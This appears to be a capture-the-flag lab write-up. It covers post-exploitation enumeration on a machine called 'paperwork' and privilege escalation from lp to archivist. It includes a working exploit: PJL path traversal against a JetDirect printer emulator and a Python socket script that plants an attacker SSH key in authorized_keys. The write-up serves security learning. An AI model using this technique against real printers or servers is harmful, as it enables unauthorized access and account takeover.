# Post-Shell Enumeration & JetDirect Privesc

## Post-Shell Enumeration (as lp)

Got a shell as `lp` via the LPD command injection exploit (see Exploitation section above).

```bash
lp@paperwork:/opt/LPDServer$ sudo -l
Command 'sudo' not found

lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)

lp@paperwork:/opt/LPDServer$ ls -la /opt/LPDServer/
total 12
drwxr-xr-x 2 root lp   4096 May 28 15:45 .
drwxr-xr-x 3 root root 4096 May 28 15:45 ..
-rw-r-xr-- 1 root lp   2940 Mar 12 07:22 server.py
```

No sudo binary installed, no useful writable paths, no cron leads. Checked systemd unit for the LPD service -- confirmed it just runs as `lp` (no escalation there):

```bash
[Service]
Type=simple
User=lp
Environment="LPD_QUEUE=archive_intake"
WorkingDirectory=/opt/LPDServer
ExecStart=/usr/bin/python3 /opt/LPDServer/server.py
```

Checked listening ports -- found two internal-only services not visible from the external nmap scan:

```bash
lp@paperwork:/opt/LPDServer$ ss -tlnp
LISTEN 0 100 0.0.0.0:1515   python3 (LPD server, already known)
LISTEN 0 100 127.0.0.1:9100 (unlabeled)
LISTEN 0 128 127.0.0.1:1337 (unlabeled)
```

Checked running processes to identify owners:

```bash
lp@paperwork:/opt/LPDServer$ ps aux | grep -i python
root     958  /usr/bin/python3 /root/staging/CorpoSite/app.py
archivi+ 978  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
lp       979  /usr/bin/python3 /opt/LPDServer/server.py
```

Key findings:

- Port 1337 = the same "Intranet Archiving" Flask app, but running **as root** (Werkzeug dev server) -- likely the "offline management console" mentioned on the public site
- Port 9100 = a JetDirect/PJL raw-printer emulator running **as archivist** -- classic HP printer raw port, worth targeting for file read/write primitives

## JetDirect PJL Path Traversal

Confirmed `jetdirect.py` speaks real PJL by sending an INFO ID probe:

```bash
>>> @PJL INFO ID
<<< HP LASERJET 4ML
```

Pulled the service's own source via `FSUPLOAD` (it exposes its own working directory as `0:\`), which revealed the vulnerable path handling:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))
```

**Bug: no traversal sanitization.** `_translate` strips `0:` and leading slashes but does nothing to block `../` sequences -- `os.path.normpath(os.path.join(...))` happily resolves them outside the intended root (`/home/archivist/printer/`). Since the process runs as `archivist`, this gives arbitrary file read **and write** as that user via the existing `FSUPLOAD` / `FSDOWNLOAD` PJL commands.

Confirmed traversal depth empirically -- root (`0:\`) maps directly to `/home/archivist/printer/`, so a single `..` reaches `/home/archivist/`:

```bash
>>> @PJL FSDIRLIST NAME="0:\..\" ENTRY=1 COUNT=100
<<< . TYPE=DIR
    .. TYPE=DIR
    .cache TYPE=DIR
    .bashrc TYPE=FILE SIZE=3771
    .local TYPE=DIR
    .ssh TYPE=DIR
    .profile TYPE=FILE SIZE=807
    .lesshst TYPE=FILE SIZE=20
    .bash_history TYPE=FILE SIZE=0
    user.txt TYPE=FILE SIZE=33
    .bash_logout TYPE=FILE SIZE=220
    .gnupg TYPE=DIR
    printer TYPE=DIR
```

`user.txt` visible directly in the listing. `.ssh/authorized_keys` existed but was empty (0 bytes) -- no private key to steal, but since writes go through the same unsanitized `_translate`, pushed a self-generated public key instead.

## Privesc: lp -> archivist via forged authorized_keys

Generated a fresh keypair locally (not reusing personal keys):

```bash
ssh-keygen -t ed25519 -f /tmp/archivist_key -N ""
```

Wrote the public key into `archivist`'s `authorized_keys` using the PJL `FSDOWNLOAD` command through the same traversal path:

```python
import socket
pubkey = open('/tmp/archivist_key.pub','rb').read()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
cmd = b'\x1b%-12345X@PJL FSDOWNLOAD NAME="0:\\..\\.ssh\\authorized_keys" SIZE=' + str(len(pubkey)).encode() + b'\r\n'
s.send(cmd)
s.send(pubkey)
```

```bash
Response: OK
```

Logged in directly as `archivist`:

```bash
lp@paperwork:/opt/LPDServer$ ssh -i /tmp/archivist_key archivist@10.129.83.151
Last login: Sun Jul 12 13:53:34 2026 from 10.129.83.151
archivist@paperwork:~$
```

**Result: shell access as `archivist` obtained.**

## Status / Next Steps

- [x]  RCE as `lp` via LPD command injection
- [x]  Discovered internal-only ports 9100 (JetDirect/PJL, runs as archivist) and 1337 (root-owned Flask console)
- [x]  Found path traversal in JetDirect PJL filesystem handler
- [x]  Privesc lp -> archivist via forged SSH key written through the traversal bug
- [ ]  Confirm/collect user.txt content from archivist's home
- [ ]  Enumerate archivist for further privesc (sudo -l, SUID, cron) toward root
- [ ]  Investigate the root-owned Flask app on port 1337 as a possible direct-to-root path (separate from the archivist route)